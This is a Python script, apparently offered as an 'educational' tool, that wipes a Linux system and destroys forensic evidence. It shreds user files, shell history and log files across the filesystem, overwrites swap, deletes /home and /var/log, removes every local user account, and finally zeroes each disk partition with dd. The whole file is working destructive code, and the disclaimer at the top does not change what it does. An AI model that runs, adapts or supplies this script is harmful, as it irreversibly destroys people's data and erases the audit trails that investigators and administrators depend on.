#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com

# I am not to be liable for direct,
# indirect or consequential damages or
# for any loss of revenue, profits or
# data arising in connection with using
# this tool, including, but not limited to,
# medical, physical and psychological effects.
# It is intended for educational purposes only.

from os import walk
from os import path
from os import system
from threading import Thread
from subprocess import Popen
from subprocess import PIPE

# type 'whoami'
account_name = 'YOUR ACCOUNT NAME'

# file size 100 MB
file_size = 100000000


def last_operations():
    for root, dirs, files in walk("/home/" + account_name + '/Desktop'):
        for file in files:
            try:
                system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                if root == "/home/" + account_name + '/Desktop':
                    system('touch ' + path.join(root, file) + ' 2>/dev/null')
            except:
                pass

    for root, dirs, files in walk("/home/" + account_name):
        if 'Desktop' not in root:
            for file in files:
                try:
                    system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass

    for root, dirs, files in walk("/"):
        for file in files:
            if ".bash" in file and not file.endswith('.js') and not file.endswith('.gz') \
                    and not file.endswith('.tar') and not file.endswith('.rar') \
                    and not file.endswith('.zip') and not file.endswith('.xz'):
                try:
                    system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                    system('cat /dev/null > ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass

    for root, dirs, files in walk("/"):
        for file in files:
            if "log" in file:
                try:
                    system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass

    try:
        empty_trash()
    except:
        pass

    try:
        system('rm -rf /home' + ' 2>/dev/null')
    except:
        pass

    try:
        system('deluser --remove-home --remove-all-files --quiet --force ' + account_name + ' 2>/dev/null')
    except:
        pass


def get_local_users():
    passwd = open('/etc/passwd', 'r')
    local_users = passwd.readlines()
    for user in range(0, len(local_users)):
        local_users[user] = (local_users[user].split(':')[0])
    return local_users


def remove_users():
    users = local_users
    for user in users:
        try:
            if user != account_name:
                system('deluser --remove-home --remove-all-files --quiet --force ' + str(user) + ' 2>/dev/null')
        except:
            pass


def find_remove_log_files():
    for root, dirs, files in walk("/"):
        for file in files:
            if "log" in file:
                try:
                    if path.getsize(path.join(root, file)) <= file_size:
                        system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass


def clean_bash_history():
    for root, dirs, files in walk("/"):
        for file in files:
            if ".bash" in file and not file.endswith('.js') and not file.endswith('.gz') \
                    and not file.endswith('.tar') and not file.endswith('.rar') \
                    and not file.endswith('.zip') and not file.endswith('.xz'):
                try:
                    if path.getsize(path.join(root, file)) <= file_size:
                        system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                        system('cat /dev/null > ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass


def empty_trash():
    for user in local_users:
        try:
            system('shred -zu /home/' + user + '/.local/share/Trash/* ' + ' 2>/dev/null')
            system('shred -zu /home/' + user + '/.local/share/Trash/files/*' + ' 2>/dev/null')
            system('shred -zu /home/' + user + '/.local/share/Trash/info/*' + ' 2>/dev/null')
            system('rm -rf /home/' + user + '/.local/share' + ' 2>/dev/null')
        except:
            pass


def remove_swap():
    try:
        system('swapoff --all 2>/dev/null')
    except:
        pass

    fstab = open('/etc/fstab', 'r')
    for line in fstab:
        if ' swap ' in line and not line.startswith('#'):
            try:
                system('dd if=/dev/random of=' + line.split(' ')[0] + ' 2>/dev/null')
            except:
                pass

    try:
        system('find / -type f -name "*.sw[klmnop]" --delete' + ' 2>/dev/null')
    except:
        pass

    system('shred -zu /var/log/* 2>/dev/null')
    system('rm -rf /var/log 2>/dev/null')


def user_operations():
    for root, dirs, files in walk("/home/" + account_name):
        if 'Desktop' not in root:
            for file in files:
                try:
                    if path.getsize(path.join(root, file)) <= file_size:
                        system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                except:
                    pass


def user_desktop_operations():
    for root, dirs, files in walk("/home/" + account_name + '/Desktop'):
        for file in files:
            try:
                if path.getsize(path.join(root, file)) <= file_size:
                    system('shred -zu ' + path.join(root, file) + ' 2>/dev/null')
                    if root == "/home/" + account_name + '/Desktop':
                        system('touch ' + path.join(root, file) + ' 2>/dev/null')
            except:
                pass


def disk_operations():
    process = Popen(["df -h | cut -d' ' -f1"], stdout=PIPE, shell=True)
    out, err = process.communicate()
    out = out.splitlines()[1:]

    for partition in out:
        if 'tmpfs' not in partition and 'udev' not in partition:
            proc = Thread(target=overwriting, args=(partition,))
            proc.start()


def overwriting(part):
    system('dd if=/dev/zero of=' + str(part) + ' bs=1024 2>/dev/null')


def main():
    global local_users
    local_users = get_local_users()

    swap_t1           = Thread(target=remove_swap, )
    user_desktop_t1   = Thread(target=user_desktop_operations, )
    bash_t2           = Thread(target=clean_bash_history, )
    user_operation_t2 = Thread(target=user_operations, )
    log_t4            = Thread(target=find_remove_log_files, )
    del_users_t5      = Thread(target=remove_users, )

    swap_t1.start()
    bash_t2.start()
    user_desktop_t1.start()
    user_operation_t2.start()
    log_t4.start()

    swap_t1.join()
    bash_t2.join()
    user_desktop_t1.join()
    user_operation_t2.join()
    log_t4.join()

    try:
        last_operations()
    except:
        pass

    del_users_t5.start()

    disk_operations()

main()
